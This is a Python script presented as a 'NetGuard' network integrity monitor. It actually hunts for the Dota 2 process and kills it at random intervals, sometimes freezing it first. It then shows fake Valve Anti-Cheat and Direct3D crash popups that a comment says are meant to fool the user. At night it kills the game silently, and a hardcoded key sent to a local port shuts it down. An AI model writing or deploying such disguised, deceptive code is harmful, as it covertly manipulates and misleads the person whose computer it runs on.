"""
NetGuard Service
Background network integrity monitor.
"""

import os
import sys
import time
import random
import psutil
import ctypes
import threading
import socket
from datetime import datetime

# --- CONFIG ---
ADMIN_KEY = "wake_up_sanya"
ADMIN_PORT = 65432
TARGET_PROCESS = "dota2.exe"
SCAN_INTERVAL_MIN = 5 * 60
SCAN_INTERVAL_MAX = 30 * 60
FREEZE_CHANCE_PERCENT = 35
FREEZE_DURATION_SEC = 12

# Сообщения, которые увидит "пользователь" — намеренно мимикрируют под Valve/D3D
error_messages = [
    "Valve Anti-Cheat Error: Unauthorized memory patch detected at offset 0x7FF6B. Client integrity compromised. (Error Code: 1114)",
    "Direct3D 11 Error: Overlay hook failed to initialize. D3D11CreateDeviceAndSwapChain returned E_FAIL.",
    "Unhandled Exception: EXCEPTION_ACCESS_VIOLATION (0xc0000005) at VTable index 12. Attempted to execute arbitrary code.",
    "CSchemaSystem::Load(): VPK signature mismatch or corrupted memory allocation. Please verify integrity of game files.",
    "Engine Error: DXGI_ERROR_DEVICE_HUNG. The application's device failed due to badly formed commands."
]

POPUP_TITLE = "Dota 2 - Fatal Error"


def terminate_target(show_popup=True):
    for proc in psutil.process_iter(['name']):
        try:
            name = (proc.info['name'] or "").lower()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

        if name == TARGET_PROCESS:
            try:
                if show_popup and random.randint(1, 100) <= FREEZE_CHANCE_PERCENT:
                    proc.suspend()
                    time.sleep(FREEZE_DURATION_SEC)
                    proc.resume()

                proc.kill()

                if show_popup:
                    msg = random.choice(error_messages)
                    threading.Thread(
                        target=lambda: ctypes.windll.user32.MessageBoxW(
                            0, msg, POPUP_TITLE, 0x10 | 0x0
                        ),
                        daemon=True
                    ).start()
                return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    return False


def service_loop():
    next_event_time = time.time() + random.randint(SCAN_INTERVAL_MIN, SCAN_INTERVAL_MAX)

    while True:
        current_hour = datetime.now().hour

        # Тихий режим в позднее время — без всплывающих окон
        if current_hour >= 23 or current_hour < 6:
            terminate_target(show_popup=False)
            time.sleep(3)
            continue

        if time.time() >= next_event_time:
            if terminate_target(show_popup=True):
                next_event_time = time.time() + random.randint(SCAN_INTERVAL_MIN, SCAN_INTERVAL_MAX)

        time.sleep(10)


def admin_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('localhost', ADMIN_PORT))
    except OSError as e:
        print(f"Port {ADMIN_PORT} unavailable: {e}")
        sys.exit(1)
    server.listen(1)

    while True:
        conn, addr = server.accept()
        try:
            data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
            if data == ADMIN_KEY:
                conn.sendall(b"Access granted. Shutting down...\n")
                conn.close()
                os._exit(0)
            else:
                conn.sendall(b"Access denied.\n")
        finally:
            conn.close()


if __name__ == "__main__":
    worker = threading.Thread(target=service_loop, daemon=True)
    worker.start()
    admin_listener()
